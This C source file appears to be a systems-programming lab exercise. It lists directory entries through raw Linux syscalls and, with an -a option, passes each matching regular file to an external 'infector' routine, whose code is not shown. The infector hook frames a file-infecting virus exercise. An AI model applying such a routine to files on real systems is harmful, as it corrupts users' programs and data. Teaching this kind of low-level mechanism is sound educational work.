#include "util.h"
#include <stdio.h>
#include <string.h>
#define SYS_WRITE 4
#define STDOUT 1
#define STDERR 2
#define STDIN 0
#define SYS_READ 3
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_LESEEK 19
#define SYS_GETDENTS 141
#define O_RDONLY  0
#define O_WRONLY  1
#define O_RDWR    2
#define O_CREAT  0x40
#define O_TRUNC  0x200
#define O_APPEND 0x400
#define O_DIRECTORY 0x10000

# define DT_UNKNOWN 0
# define DT_FIFO  1
# define DT_CHR   2
# define DT_DIR   4
# define DT_BLK   6
# define DT_REG   8
# define DT_LNK   10
# define DT_SOCK  12
# define DT_WHT   14

#define LBUFF_SIZE 12
char lbuffer[LBUFF_SIZE];
struct linux_dirent {
           int   d_ino;
           int   d_off;
           short d_reclen;
           char  d_name[];
};
char complete[1<<12];

extern int system_call();
extern int infector();

void debugger(int code,int ret);
void concat(const char *str);
int main (int argc , char* argv[], char* envp[])
{
  
  int debug_mode=0;
  int i;
  char s_suffix = 0;
  char a_suffix = 0;
  int root = system_call(SYS_OPEN, ".", O_RDONLY | O_DIRECTORY);
  int ret_val=0;

  for(i=1;i<argc;i++){
      if(strcmp(argv[i],"-s")==0){
          if(strlen(argv[i+1]) != 1){
            system_call(SYS_WRITE,STDERR,"Ilegal -s suffix, needs to be one char only!\n", 46);
            return 1;
          }else 
            s_suffix=argv[++i][0];
      }else if(strcmp(argv[i],"-a")==0){
          if(strlen(argv[i+1]) != 1){
            system_call(SYS_WRITE,STDERR,"Ilegal -a suffix, needs to be one char only!\n", 46);
            return 1;
          }else 
            a_suffix=argv[++i][0];
      }else if(strcmp(argv[i],"-d")==0) {
          debug_mode=1;
      }
  }
  if(root < 0){
    system_call(SYS_WRITE,STDERR,"Error while readin DIR!\n", 25);
    return 1;
  }else if(debug_mode)
    debugger(SYS_OPEN,root);
  int nread;
  int bpos;
  char d_type;
  struct linux_dirent *d;
  char buff[8192];
  
  
    nread = system_call(SYS_GETDENTS, root, buff, 8192);
    if (nread < 0){
      system_call(SYS_WRITE,STDERR,"Error while geting DIR info!\n", 30);
      return 1;
    }else if(debug_mode)
      debugger(SYS_GETDENTS,nread);
    if (nread == 0)
      return 0;
    concat("----------------------- nread = ");
    concat(itoa(nread));
    concat(" ------------------------\n\n");
    concat(" inode#         file type      d_reclen      d_off      d_name\n");
    concat("------------------------------------------------------------\n");
    concat("------------------------------------------------------------\n");
    ret_val=system_call(SYS_WRITE,STDOUT,complete, strlen(complete));
    if(debug_mode)
      debugger(SYS_WRITE,ret_val);
    complete[0]='\0';
    for (bpos = 0; bpos < nread;) {
      d = (struct linux_dirent *) (buff + bpos);
      int last=strlen(d->d_name)-1;
      if((s_suffix && d->d_name[last]==s_suffix) || (s_suffix==0)){
        concat(itoa(d->d_ino));
        d_type = *(buff + bpos + d->d_reclen - 1);
        concat("      ");
        concat((d_type == DT_REG) ?  "regular  " :
        (d_type == DT_DIR) ?  "directory" :
        (d_type == DT_FIFO) ? "FIFO     " :
        (d_type == DT_SOCK) ? "socket   " :
        (d_type == DT_LNK) ?  "symlink  " :
        (d_type == DT_BLK) ?  "block dev" :
        (d_type == DT_CHR) ?  "char dev " : "???      ");
        concat("          ");
        concat(itoa(d->d_reclen));
        concat("          ");
        concat(itoa(d->d_off));
        concat("         ");
        concat(d->d_name);
        concat(" \n\n");
        ret_val=system_call(SYS_WRITE,STDOUT,complete, strlen(complete));
        if(debug_mode)
          debugger(SYS_WRITE,ret_val);
        complete[0]='\0';
      }
      if((a_suffix && d->d_name[last]==a_suffix && d_type==DT_REG)){
            infector(d->d_name);
      }
      bpos += d->d_reclen;
    }
  
  return 0;
}
void debugger(int code,int ret){
  system_call(SYS_WRITE,STDERR,"dbg: system_call - ID: ",23);
  system_call(SYS_WRITE,STDERR,itoa(code),strlen(itoa(code)));
  system_call(SYS_WRITE,STDERR," return value: ",16);
  system_call(SYS_WRITE,STDERR,itoa(ret),strlen(itoa(ret))); 
  system_call(SYS_WRITE,STDERR,"\n",2); 
}
void concat(const char *str){
  int i;
  for(i=0;complete[i]!='\0';i++){} 
  while(*str!='\0'){
    complete[i++]=*(str++);
  }
  complete[i]='\0'; 
}
